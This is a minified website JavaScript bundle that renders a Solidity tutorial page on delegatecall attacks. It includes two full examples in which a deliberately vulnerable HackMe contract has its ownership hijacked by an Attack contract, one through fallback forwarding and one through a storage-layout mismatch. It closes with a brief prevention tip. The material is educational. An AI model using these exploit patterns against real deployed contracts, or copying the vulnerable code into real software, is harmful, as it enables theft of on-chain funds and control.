"use strict";(self.webpackChunkmy_website=self.webpackChunkmy_website||[]).push([[1644],{3905:function(e,n,t){t.d(n,{Zo:function(){return u},kt:function(){return h}});var a=t(7294);function i(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function r(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);n&&(a=a.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,a)}return t}function l(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?r(Object(t),!0).forEach((function(n){i(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):r(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function o(e,n){if(null==e)return{};var t,a,i=function(e,n){if(null==e)return{};var t,a,i={},r=Object.keys(e);for(a=0;a<r.length;a++)t=r[a],n.indexOf(t)>=0||(i[t]=e[t]);return i}(e,n);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);for(a=0;a<r.length;a++)t=r[a],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(i[t]=e[t])}return i}var c=a.createContext({}),s=function(e){var n=a.useContext(c),t=n;return e&&(t="function"==typeof e?e(n):l(l({},n),e)),t},u=function(e){var n=s(e.components);return a.createElement(c.Provider,{value:n},e.children)},d={inlineCode:"code",wrapper:function(e){var n=e.children;return a.createElement(a.Fragment,{},n)}},p=a.forwardRef((function(e,n){var t=e.components,i=e.mdxType,r=e.originalType,c=e.parentName,u=o(e,["components","mdxType","originalType","parentName"]),p=s(t),h=i,m=p["".concat(c,".").concat(h)]||p[h]||d[h]||r;return t?a.createElement(m,l(l({ref:n},u),{},{components:t})):a.createElement(m,l({ref:n},u))}));function h(e,n){var t=arguments,i=n&&n.mdxType;if("string"==typeof e||i){var r=t.length,l=new Array(r);l[0]=p;var o={};for(var c in n)hasOwnProperty.call(n,c)&&(o[c]=n[c]);o.originalType=e,o.mdxType="string"==typeof e?e:i,l[1]=o;for(var s=2;s<r;s++)l[s]=t[s];return a.createElement.apply(null,l)}return a.createElement.apply(null,t)}p.displayName="MDXCreateElement"},159:function(e,n,t){t.r(n),t.d(n,{contentTitle:function(){return c},default:function(){return p},frontMatter:function(){return o},metadata:function(){return s},toc:function(){return u}});var a=t(7462),i=t(3366),r=(t(7294),t(3905)),l=["components"],o={title:"DelegatecallAttack",version:"0.8.10",description:"An example of exploits using delegatecall in Solidity"},c=void 0,s={unversionedId:"example/DelegateCallAtack",id:"example/DelegateCallAtack",isDocsHomePage:!1,title:"DelegatecallAttack",description:"An example of exploits using delegatecall in Solidity",source:"@site/docs/example/DelegateCallAtack.md",sourceDirName:"example",slug:"/example/DelegateCallAtack",permalink:"/rooctblog/docs/example/DelegateCallAtack",tags:[],version:"current",frontMatter:{title:"DelegatecallAttack",version:"0.8.10",description:"An example of exploits using delegatecall in Solidity"},sidebar:"docs",previous:{title:"Delegatecall",permalink:"/rooctblog/docs/example/Delegatecall"},next:{title:"Denial of Service",permalink:"/rooctblog/docs/example/DenialOfSevice"}},u=[{value:"Vulnerability",id:"vulnerability",children:[]},{value:"Preventative Techniques",id:"preventative-techniques",children:[]}],d={toc:u};function p(e){var n=e.components,t=(0,i.Z)(e,l);return(0,r.kt)("wrapper",(0,a.Z)({},d,t,{components:n,mdxType:"MDXLayout"}),(0,r.kt)("h3",{id:"vulnerability"},"Vulnerability"),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"delegatecall")," is tricky to use and wrong usage or incorrect understanding\ncan lead to devastating results."),(0,r.kt)("p",null,"You must keep 2 things in mind when using ",(0,r.kt)("inlineCode",{parentName:"p"},"delegatecall")),(0,r.kt)("ol",null,(0,r.kt)("li",{parentName:"ol"},(0,r.kt)("inlineCode",{parentName:"li"},"delegatecall")," preserves context (storage, caller, etc...)"),(0,r.kt)("li",{parentName:"ol"},"storage layout must be the same for the contract calling ",(0,r.kt)("inlineCode",{parentName:"li"},"delegatecall")," and the contract getting called")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-solidity"},"// SPDX-License-Identifier: MIT\npragma solidity ^0.8.10;\n\n/*\nHackMe is a contract that uses delegatecall to execute code.\nIt it is not obvious that the owner of HackMe can be changed since there is no\nfunction inside HackMe to do so. However an attacker can hijack the\ncontract by exploiting delegatecall. Let's see how.\n\n1. Alice deploys Lib\n2. Alice deploys HackMe with address of Lib\n3. Eve deploys Attack with address of HackMe\n4. Eve calls Attack.attack()\n5. Attack is now the owner of HackMe\n\nWhat happened?\nEve called Attack.attack().\nAttack called the fallback function of HackMe sending the function\nselector of pwn(). HackMe forwards the call to Lib using delegatecall.\nHere msg.data contains the function selector of pwn().\nThis tells Solidity to call the function pwn() inside Lib.\nThe function pwn() updates the owner to msg.sender.\nDelegatecall runs the code of Lib using the context of HackMe.\nTherefore HackMe's storage was updated to msg.sender where msg.sender is the\ncaller of HackMe, in this case Attack.\n*/\n\ncontract Lib {\n    address public owner;\n\n    function pwn() public {\n        owner = msg.sender;\n    }\n}\n\ncontract HackMe {\n    address public owner;\n    Lib public lib;\n\n    constructor(Lib _lib) {\n        owner = msg.sender;\n        lib = Lib(_lib);\n    }\n\n    fallback() external payable {\n        address(lib).delegatecall(msg.data);\n    }\n}\n\ncontract Attack {\n    address public hackMe;\n\n    constructor(address _hackMe) {\n        hackMe = _hackMe;\n    }\n\n    function attack() public {\n        hackMe.call(abi.encodeWithSignature(\"pwn()\"));\n    }\n}\n\n")),(0,r.kt)("p",null,"Here is another example."),(0,r.kt)("p",null,"You will need to understand how Solidity stores\nstate variables before you can understand this exploit."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-solidity"},'// SPDX-License-Identifier: MIT\npragma solidity ^0.8.10;\n\n/*\nThis is a more sophisticated version of the previous exploit.\n\n1. Alice deploys Lib and HackMe with the address of Lib\n2. Eve deploys Attack with the address of HackMe\n3. Eve calls Attack.attack()\n4. Attack is now the owner of HackMe\n\nWhat happened?\nNotice that the state variables are not defined in the same manner in Lib\nand HackMe. This means that calling Lib.doSomething() will change the first\nstate variable inside HackMe, which happens to be the address of lib.\n\nInside attack(), the first call to doSomething() changes the address of lib\nstore in HackMe. Address of lib is now set to Attack.\nThe second call to doSomething() calls Attack.doSomething() and here we\nchange the owner.\n*/\n\ncontract Lib {\n    uint public someNumber;\n\n    function doSomething(uint _num) public {\n        someNumber = _num;\n    }\n}\n\ncontract HackMe {\n    address public lib;\n    address public owner;\n    uint public someNumber;\n\n    constructor(address _lib) {\n        lib = _lib;\n        owner = msg.sender;\n    }\n\n    function doSomething(uint _num) public {\n        lib.delegatecall(abi.encodeWithSignature("doSomething(uint256)", _num));\n    }\n}\n\ncontract Attack {\n    // Make sure the storage layout is the same as HackMe\n    // This will allow us to correctly update the state variables\n    address public lib;\n    address public owner;\n    uint public someNumber;\n\n    HackMe public hackMe;\n\n    constructor(HackMe _hackMe) {\n        hackMe = HackMe(_hackMe);\n    }\n\n    function attack() public {\n        // override address of lib\n        hackMe.doSomething(uint(uint160(address(this))));\n        // pass any number as input, the function doSomething() below will\n        // be called\n        hackMe.doSomething(1);\n    }\n\n    // function signature must match HackMe.doSomething()\n    function doSomething(uint _num) public {\n        owner = msg.sender;\n    }\n}\n\n')),(0,r.kt)("h3",{id:"preventative-techniques"},"Preventative Techniques"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"Use stateless ",(0,r.kt)("inlineCode",{parentName:"li"},"Library"))))}p.isMDXComponent=!0}}]);